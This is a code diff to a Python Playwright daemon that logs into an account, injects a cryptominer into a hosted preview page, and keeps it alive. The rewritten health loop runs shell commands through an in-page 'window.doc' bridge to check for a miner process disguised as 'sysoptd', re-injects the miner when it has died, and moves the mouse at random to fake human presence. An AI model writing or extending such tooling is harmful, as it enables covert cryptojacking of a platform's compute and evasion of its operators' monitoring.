@@ -231,7 +231,7 @@ async def do_login(page, email, password, totp_secret=None):
 
 async def run_daemon(session_id, project_id, browser_type, threads, mode):
     from playwright.async_api import async_playwright
-    from miner_injector import inject_miner, health_check_loop
+    from miner_injector import inject_miner
 
     config = load_config_sync(session_id)
     log(f"Session: {session_id} ({config.get('email', '?')})")
@@ -423,14 +423,56 @@ async def run_daemon(session_id, project_id, browser_type, threads, mode):
             log("Starting health check loop...")
             last_refresh = time.time()
 
-            # health_check_loop runs indefinitely in full mode
-            # We wrap it to add token refresh
-            health_task = asyncio.create_task(
-                health_check_loop(
-                    preview_page, preview_url,
-                    mode=mode, bridge_url=BRIDGE_URL,
-                    context=context, max_runtime_minutes=None,
-                    session_config=config, chat_url=chat_url))
+            async def daemon_health_loop():
+                """Simplified health check — no hanging navigation calls."""
+                iteration = 0
+                while True:
+                    iteration += 1
+                    log(f"Health check #{iteration}...")
+                    try:
+                        # Check doc bridge (worker alive)
+                        try:
+                            ready = await preview_page.evaluate(
+                                "() => !!(window.doc && typeof window.doc === 'function')")
+                            if ready:
+                                probe = await preview_page.evaluate("""async () => {
+                                    try {
+                                        const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                                        return r && r.stdout !== undefined ? r.stdout.trim() : 'no-probe';
+                                    } catch(e) { return 'probe-error'; }
+                                }""")
+                                log(f"  Worker alive (probe: {probe})")
+                            else:
+                                log("  Worker dead — re-injecting...")
+                                await inject_miner(preview_page, BRIDGE_URL, threads)
+                        except Exception as e:
+                            log(f"  Probe error: {e}")
+
+                        # Check preview health
+                        try:
+                            url = preview_page.url
+                            if "/login" in url:
+                                log("  Preview redirected to login!")
+                            else:
+                                log("  Preview healthy")
+                        except Exception:
+                            log("  Preview unreachable")
+
+                        # Human presence (quick, non-blocking)
+                        try:
+                            import random as _r
+                            await preview_page.mouse.move(_r.randint(100, 800), _r.randint(100, 500))
+                            await asyncio.sleep(0.5)
+                        except Exception:
+                            pass
+
+                    except Exception as e:
+                        log(f"  Health check error: {e}")
+
+                    log(f"  Next check in 180s...")
+                    await asyncio.sleep(180)
+
+            health_task = asyncio.create_task(daemon_health_loop())
 
             # Token refresh loop runs alongside
             while not health_task.done():
